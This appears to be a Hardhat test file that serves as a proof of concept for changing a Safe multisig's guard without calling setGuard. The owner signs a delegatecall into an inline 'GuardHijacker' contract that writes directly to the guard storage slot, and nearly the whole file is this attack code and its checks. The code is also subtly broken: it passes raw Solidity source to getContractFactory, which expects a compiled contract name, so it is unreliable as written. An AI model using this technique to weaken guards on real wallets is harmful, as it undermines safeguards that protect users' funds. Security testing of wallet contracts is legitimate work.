
// test/GuardBypass.test.ts
const {
    loadFixture
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
import { expect } from "chai";
import { ethers } from "hardhat";

const GUARD_SLOT = "0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8"; // GUARD_STORAGE_SLOT

describe("Safe guard can be changed without setGuard via delegatecall", function () {
  it("changes the guard by delegatecall without calling setGuard", async function () {
    const [deployer, owner, newGuardEOA] = await ethers.getSigners();

    // Deploy Safe singleton
    const Safe = await ethers.getContractFactory("Safe");
    const safeSingleton = await Safe.deploy();
    await safeSingleton.deployed();

    // Deploy SafeProxyFactory
    const Factory = await ethers.getContractFactory("SafeProxyFactory");
    const factory = await Factory.deploy();
    await factory.deployed();

    // Prepare initializer for proxy: setup(owner, threshold=1, to=0, data=0x, fallback=0, paymentToken=0, payment=0, receiver=0)
    const initializer = safeSingleton.interface.encodeFunctionData("setup", [
      [await owner.getAddress()],
      1,
      ethers.constants.AddressZero,
      "0x",
      ethers.constants.AddressZero,
      ethers.constants.AddressZero,
      0,
      ethers.constants.AddressZero,
    ]);

    // Create Proxy
    const proxyTx = await factory.createProxyWithNonce(safeSingleton.address, initializer, 0);
    const receipt = await proxyTx.wait();
    const proxyAddress = receipt.events?.find(e => e.event === "ProxyCreation")?.args?.proxy;
    expect(proxyAddress).to.properAddress;

    const safe = Safe.attach(proxyAddress);

    // Deploy Attack contract that writes to GUARD_STORAGE_SLOT
    const Attack = await ethers.getContractFactory(`
      // SPDX-License-Identifier: UNLICENSED
      pragma solidity ^0.8.20;
      contract GuardHijacker {
        bytes32 constant GUARD_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;
        function hijack(address newGuard) external {
          assembly {
            sstore(GUARD_SLOT, newGuard)
          }
        }
      }
    `);
    const attack = await Attack.deploy();
    await attack.deployed();

    // Helper to read the guard from storage
    async function readGuardAddress() {
      const raw = await safe.getStorageAt(ethers.BigNumber.from(GUARD_SLOT), 1);
      // take the lower 20 bytes of the 32-byte slot
      const addrHex = ethers.utils.hexDataSlice(raw, 12); // bytes[12:32]
      return ethers.utils.getAddress(addrHex);
    }

    // Initially, guard should be zero
    const initial = await readGuardAddress();
    expect(initial).to.equal("0x0000000000000000000000000000000000000000");

    // Prepare execTransaction parameters to delegatecall attack.hijack(newGuardEOA)
    const to = attack.address;
    const value = 0;
    const data = attack.interface.encodeFunctionData("hijack", [await newGuardEOA.getAddress()]);
    const operation = 1; // Enum.Operation.DelegateCall
    const safeTxGas = 0;
    const baseGas = 0;
    const gasPrice = 0;
    const gasToken = ethers.constants.AddressZero;
    const refundReceiver = ethers.constants.AddressZero;

    // Prevalidated signature (v=1) by msg.sender == owner, no EIP712 signing needed
    const ownerAddr = await owner.getAddress();
    const r = ethers.utils.hexZeroPad(ownerAddr, 32);
    const s = ethers.utils.hexZeroPad("0x00", 32);
    const v = "01"; // 1 byte
    const signatures = r + s.slice(2) + v;

    // Execute as owner
    await safe.connect(owner).execTransaction(
      to,
      value,
      data,
      operation,
      safeTxGas,
      baseGas,
      gasPrice,
      gasToken,
      refundReceiver as any,
      signatures,
      { value: 0 }
    );

    // Guard has changed without calling setGuard
    const updated = await readGuardAddress();
    expect(updated).to.equal(await newGuardEOA.getAddress());
    expect(updated).to.not.equal(initial);
  });
});